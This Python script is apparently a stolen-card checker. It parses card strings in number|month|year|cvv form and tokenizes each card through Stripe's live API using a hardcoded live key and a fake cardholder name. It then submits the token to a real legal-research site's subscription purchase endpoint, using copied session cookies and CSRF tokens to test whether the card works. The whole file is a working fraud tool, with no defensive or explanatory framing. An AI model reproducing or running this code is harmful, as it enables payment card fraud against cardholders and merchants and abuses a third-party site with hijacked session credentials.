import time
import requests
from fake_useragent import UserAgent
import random
import re
from bs4 import BeautifulSoup
import base64
import asyncio

def Tele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvp = ccx.split("|")[3]
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    r = requests.session()
    
    user_agent = UserAgent().random
    
    data = f'guid=d8e89c41-bd77-4d16-9216-d609823c13914c8545&muid=4f201248-fae5-4ef8-84af-7431fbc132a0f0f37a&sid=8cd75d21-fae5-4a22-929c-15f6ccd79a52a02186&referrer=https%3A%2F%2Ftrellis.law&time_on_page=33755&card[name]=John+Libertt&card[number]={n}&card[cvc]={cvp}&card[exp_month]=11&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fc0b5539ba7%3B+stripe-js-v3%2Fc0b5539ba7%3B+split-card-element&key=pk_live_4xBSuaxricW1SmAkbwdiYH9h'

    response = requests.post('https://api.stripe.com/v1/tokens', data=data)
    try:
        id=(response.json()['id'])
    except KeyError:
        print(response.json())
    

    cookies = {
    'states_selected': 'ca',
    'SIGNUP_VERSION': 'signup_google',
    'PURCHASE_VERSION': 'purchase_lawyer_baseline',
    'NON_LAWYER_PURCHASE_VERSION': 'purchase_non_lawyer_plan_name_07112022_b',
    'AUTHENTICATED_ACCESS': 'partial_access',
    'TRIAL_ACTIONS_VERSION': 'False10',
    'NON_LAWYER_PRICING_VERSION': 'non_lawyer_pricing_baseline',
    'LAWYER_PRICING_VERSION': 'lawyer_pricing_baseline',
    'ALERT_PLG_TEST': 'VariantViridian',
    'HUBSPOT_LAWYER_VERSION': 'baseline',
    'AI_PLG_TEST_VERSION': 'VariantBlueberry',
    'version_distinct_id': '830d8ca6-6fa2-4c11-b951-16754d3d4d3d',
    '_gid': 'GA1.2.57044549.1749399396',
    'AMPLITUDE_DEVICE_ID': '10aa7817-63d5-483f-9f7d-c30d95ee42ecR',
    'post_logged_in_path': 'L2RvYy84NDI0ODY5My9hdHRhY2htZW50LWFjY291bnQtZG9jdW1lbnRzLXN0YXR1cy1jb3BpZXM',
    '_gcl_au': '1.1.1872797387.1749399396.668343485.1749399407.1749399418',
    'trellis_marketing_selected_plan': 'personal',
    'USER_AUTHENTICATED': 'True',
    'csrftoken': 'r3PSWxSxnfbN2P8oOYfooF08S28nYHz8',
    'sessionid': '9h4slxe0obq9u41pp9ohlfihg4sg5p5z',
    '_hjSessionUser_2494852': 'eyJpZCI6Ijg5ZGE5NWFlLTNmOGItNTNiZC1iN2M2LTVhMjU0MjgzMDM0MiIsImNyZWF0ZWQiOjE3NDkzOTk0MjU4NjUsImV4aXN0aW5nIjp0cnVlfQ==',
    '_hjSession_2494852': 'eyJpZCI6ImU1NjAyZDBkLTkzNzItNDU1Ni05MWE3LWEzYjVlNzcxNTM4NSIsImMiOjE3NDkzOTk0MjU4NzAsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
    '_hjHasCachedUserAttributes': 'true',
    'raw_query': '',
    '__stripe_mid': '4f201248-fae5-4ef8-84af-7431fbc132a0f0f37a',
    '__stripe_sid': '8cd75d21-fae5-4a22-929c-15f6ccd79a52a02186',
    '__hstc': '12320555.8bb4bdf20c97448d102cde95027a1515.1749399525435.1749399525435.1749399525435.1',
    'hubspotutk': '8bb4bdf20c97448d102cde95027a1515',
    '__hssrc': '1',
    '__hssc': '12320555.1.1749399525441',
    'NEW_TRIAL': 'true',
    'NEW_TRIAL_COOLDOWN': 'true',
    '_hjUserAttributesHash': '0717cfc84321b384bf4bc4d676e95611',
    'adblockEnabled': 'false',
    'trellis_marketing_interval': 'month',
    '_rdt_uuid': '1749399395488.e3feac45-51bc-4aa3-9723-2648e69b5fc4',
    '_ga': 'GA1.2.2064210056.1749399396',
    '_ga_RV7MFETMFQ': 'GS2.1.s1749399396$o1$g1$t1749399585$j17$l0$h0',
    'amplitude_id_5d3e6ed10c963f7039f987570bed5b5ftrellis.law': 'eyJkZXZpY2VJZCI6IjEwYWE3ODE3LTYzZDUtNDgzZi05ZjdkLWMzMGQ5NWVlNDJlY1IiLCJ1c2VySWQiOiJodGV0bXlhdGh0dW5uMjM3N0BnbWFpbC5jb20iLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE3NDkzOTkzOTU1NDgsImxhc3RFdmVudFRpbWUiOjE3NDkzOTk2MTI5NDIsImV2ZW50SWQiOjQ1LCJpZGVudGlmeUlkIjozMywic2VxdWVuY2VOdW1iZXIiOjc4fQ==',
}

    headers = {
    'authority': 'trellis.law',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json; charset=UTF-8',
    'origin': 'https://trellis.law',
    'referer': 'https://trellis.law/checkout',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user_agent,
    'x-csrftoken': 's8u2Ph6T2J8pRftNmpCUEa1O8XKivW3KJ19KBEOgfO92JUr10dH8SFRMQPIvjtsI',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    "plan": "personal_0912_monthly",
    "token": id,
    "csrfmiddlewaretoken": "s8u2Ph6T2J8pRftNmpCUEa1O8XKivW3KJ19KBEOgfO92JUr10dH8SFRMQPIvjtsI",
    "state": ["ca"],
    "add_on_ids": [""]
}

    responsey = requests.post('https://trellis.law/api/purchase/subscription',            cookies=cookies,
    headers=headers,
    json=data
)
    
    try:
        return responsey.json()
    except:
        return 'pika wikaa chutttt'
